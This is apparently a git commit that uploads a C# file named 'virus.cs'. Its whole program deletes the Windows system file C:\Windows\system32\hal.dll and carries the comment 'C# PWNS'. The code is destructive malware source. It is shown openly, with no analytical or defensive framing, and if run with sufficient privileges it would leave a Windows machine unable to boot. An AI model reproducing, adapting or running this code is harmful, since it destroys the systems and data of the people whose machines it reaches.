8767e787482771914638798050b9737b9c5e9b71
DaniiMcCalla <danmee250@yahoo.com>
2019-04-08 15:03:38 -0500

    Add files via upload

---
+++ virus.cs
@@ -0,0 +1,15 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+
+namespace HallDel
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            System.IO.File.Delete("C:\\Windows\\system32\\hal.dll"); /* C# PWNS */
+        }
+    }
+}
